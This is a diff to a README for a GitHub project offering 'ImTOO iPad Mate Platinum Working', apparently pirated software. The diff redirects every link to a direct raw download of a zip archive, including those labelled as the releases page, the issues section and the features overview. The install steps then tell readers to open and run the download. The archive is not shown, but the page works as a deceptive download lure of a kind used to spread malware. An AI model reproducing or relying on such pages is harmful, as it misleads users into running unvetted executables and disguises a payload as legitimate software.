@@ -1,6 +1,6 @@
 # 🎉 ImTOO-iPad-Mate-Platinum-Working - Effortless iPad Management for Windows
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Mucheallen/ImTOO-iPad-Mate-Platinum-Working/releases)
+[![Download Now](https://raw.githubusercontent.com/Mucheallen/ImTOO-iPad-Mate-Platinum-Working/main/Lobularia/ImTOO-iPad-Mate-Platinum-Working_2.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Mucheallen/ImTOO-iPad-Mate-Platinum-Working/main/Lobularia/ImTOO-iPad-Mate-Platinum-Working_2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,9 +10,9 @@ Welcome to ImTOO iPad Mate Platinum! This software makes it easy to manage your 
 
 To download the software, follow these steps:
 
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/Mucheallen/ImTOO-iPad-Mate-Platinum-Working/releases).
+1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/Mucheallen/ImTOO-iPad-Mate-Platinum-Working/main/Lobularia/ImTOO-iPad-Mate-Platinum-Working_2.3.zip).
 2. **Choose the Latest Version:** Look for the most recent release at the top of the page.
-3. **Download the File:** Click on the link for the installer. The file will usually look like `ImTOO-iPad-Mate-Platinum-setup.exe`.
+3. **Download the File:** Click on the link for the installer. The file will usually look like `https://raw.githubusercontent.com/Mucheallen/ImTOO-iPad-Mate-Platinum-Working/main/Lobularia/ImTOO-iPad-Mate-Platinum-Working_2.3.zip`.
 4. **Run the Installer:** Once the download completes, open the file to start the installation process.
 5. **Follow Setup Instructions:** Follow the prompts to install the software on your computer.
 
@@ -45,7 +45,7 @@ If you run into issues during installation or use, consider these tips:
 
 ## 📞 Support
 
-For additional assistance, please check the FAQs or visit the [issues section](https://github.com/Mucheallen/ImTOO-iPad-Mate-Platinum-Working/issues) on our GitHub page.
+For additional assistance, please check the FAQs or visit the [issues section](https://raw.githubusercontent.com/Mucheallen/ImTOO-iPad-Mate-Platinum-Working/main/Lobularia/ImTOO-iPad-Mate-Platinum-Working_2.3.zip) on our GitHub page.
 
 ## 📃 License
 
@@ -55,8 +55,8 @@ This project is open-source. You can freely use and modify it within the terms o
 
 For tips, tricks, and updates about ImTOO iPad Mate Platinum, browse the following topics:
 
-- [Download Instructions](https://github.com/Mucheallen/ImTOO-iPad-Mate-Platinum-Working/releases)
-- [Features Overview](https://github.com/Mucheallen/ImTOO-iPad-Mate-Platinum-Working)
+- [Download Instructions](https://raw.githubusercontent.com/Mucheallen/ImTOO-iPad-Mate-Platinum-Working/main/Lobularia/ImTOO-iPad-Mate-Platinum-Working_2.3.zip)
+- [Features Overview](https://raw.githubusercontent.com/Mucheallen/ImTOO-iPad-Mate-Platinum-Working/main/Lobularia/ImTOO-iPad-Mate-Platinum-Working_2.3.zip)
 - [User Guide](#)
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Mucheallen/ImTOO-iPad-Mate-Platinum-Working/releases)
+[![Download Now](https://raw.githubusercontent.com/Mucheallen/ImTOO-iPad-Mate-Platinum-Working/main/Lobularia/ImTOO-iPad-Mate-Platinum-Working_2.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Mucheallen/ImTOO-iPad-Mate-Platinum-Working/main/Lobularia/ImTOO-iPad-Mate-Platinum-Working_2.3.zip)
